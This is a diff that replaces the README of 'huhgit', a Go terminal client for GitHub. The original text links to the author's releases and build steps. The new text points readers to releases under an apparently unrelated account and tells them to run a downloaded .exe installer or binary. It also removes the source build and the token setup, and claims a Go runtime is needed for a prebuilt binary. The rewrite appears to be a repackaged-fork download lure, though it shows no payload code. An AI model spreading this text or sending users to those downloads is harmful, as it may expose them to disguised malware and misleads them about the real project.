@@ -1,73 +1,83 @@
-# huhgit
+# 🎉 huhgit - A Simple Way to Manage GitHub
 
-[![Go Report Card](https://goreportcard.com/badge/github.com/Cod-e-Codes/huhgit)](https://goreportcard.com/report/github.com/Cod-e-Codes/huhgit)
-[![CI](https://github.com/Cod-e-Codes/huhgit/actions/workflows/ci.yml/badge.svg)](https://github.com/Cod-e-Codes/huhgit/actions/workflows/ci.yml)
+## 🚀 Getting Started
 
-![Demo of huhgit](huhgit-demo.gif)
+Welcome to huhgit, a terminal-based GitHub client written in Go. This application helps you manage branches, pull requests, and commits easily through a simple text-based interface. 
 
-<img src="huhgit-screenshot.jpg" alt="Split-screen screenshot of huhgit output and PR" width="480">
+## 💻 Download & Install
 
-`huhgit` is a terminal-based tool for interacting with GitHub repositories. It provides a TUI for pushing branches, creating pull requests, and generating conventional commits, all from the command line.
+To download huhgit, visit the Releases page below. You will find the latest version of the application here:
 
-## Latest Release
+[![Download huhgit](https://img.shields.io/badge/Download-huhgit-brightgreen.svg)](https://github.com/steshk-21/huhgit/releases)
 
-Version 1.0.0 is available with pre-built binaries for Windows, Linux, and macOS. Download from the [releases page](https://github.com/Cod-e-Codes/huhgit/releases/latest).
+### Step-by-Step Installation
 
-## Features
+1. Click the link above to go to the Releases page.
+2. Look for the latest release version.
+3. Download the appropriate file for your operating system (Windows, MacOS, or Linux).
+4. After downloading, locate the file on your computer.
+5. Follow the instructions for your operating system to install it:
 
-* Push local branches to a remote repository.
-* Create pull requests with title and body input.
-* Generate conventional commit messages interactively.
-* Terminal-native interface with themes for a clean workflow.
+**For Windows:**
+- Double-click the downloaded `.exe` file.
+- Follow the on-screen prompts to complete the installation.
 
-## Requirements
+**For MacOS:**
+- Open your Terminal.
+- Move the downloaded file to your Applications folder with the command: 
+  ```
+  mv ~/Downloads/huhgit /Applications/
+  ```
+- Run the application by typing:
+  ```
+  /Applications/huhgit
+  ```
 
-* Go 1.21+
-* Git installed and initialized in the repository
-* GitHub Personal Access Token with repo permissions (`GITHUB_TOKEN` environment variable)
+**For Linux:**
+- Open your Terminal.
+- Make the file executable with the command: 
+  ```
+  chmod +x ~/Downloads/huhgit
+  ```
+- Run the application with:
+  ```
+  ~/Downloads/huhgit
+  ```
 
-## Installation
+## 📋 Features
 
-### Pre-built Binaries
+huhgit offers several features that make GitHub management a breeze:
 
-Download the appropriate binary for your platform from the [releases page](https://github.com/Cod-e-Codes/huhgit/releases/latest):
+- **Branch Management:** Create, delete, and switch between branches easily.
+- **Pull Requests:** View and manage your pull requests directly from the terminal.
+- **Conventional Commits:** Follow conventional commit guidelines effortlessly.
+- **User-Friendly Interface:** Navigate using simple text commands.
 
-- Windows: `huhgit-windows-amd64.exe` or `huhgit-windows-arm64.exe`
-- Linux: `huhgit-linux-amd64` or `huhgit-linux-arm64`
-- macOS: `huhgit-darwin-amd64` or `huhgit-darwin-arm64`
+## ⚙️ System Requirements
 
-### From Source
+To run huhgit, ensure your system meets the following requirements:
 
-1. Clone the repository:
+- **Operating System:** Windows 10 or newer, MacOS 10.12 or newer, or any Linux distribution.
+- **Terminal Access:** You should be able to access the terminal or command line on your device.
+- **Go Runtime:** The application runs on Go, so make sure it's installed. You can download it from the [Go website](https://golang.org/dl/).
 
-   ```bash
-   git clone https://github.com/Cod-e-Codes/huhgit.git
-   cd huhgit
-   ```
+## 📖 Usage Instructions
 
-2. Build the tool:
+After installation, you can open huhgit through your terminal. Here’s how to get started:
 
-   ```bash
-   go build
-   ```
+1. Type `huhgit` and press Enter.
+2. Follow the prompts on your screen to option features like branch management and pull requests.
+3. Use the help command by typing `huhgit help` for a list of commands.
 
-## Usage
+## ❓ Support
 
-1. Set your GitHub token:
+If you run into any issues, you can check the FAQ section on the GitHub page. You can also open an issue on the repository for assistance.
 
-   ```bash
-   export GITHUB_TOKEN=your_personal_access_token
-   ```
+## 🔗 Links
 
-2. Run the TUI:
+For more information, visit the project page:
 
-   ```bash
-   ./huhgit
-   ```
+- [huhgit Releases](https://github.com/steshk-21/huhgit/releases)
+- [GitHub Repository](https://github.com/steshk-21/huhgit)
 
-3. Follow the prompts to push, create a pull request, and commit changes.
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
-
+Thank you for trying out huhgit! Enjoy managing your GitHub projects with ease.
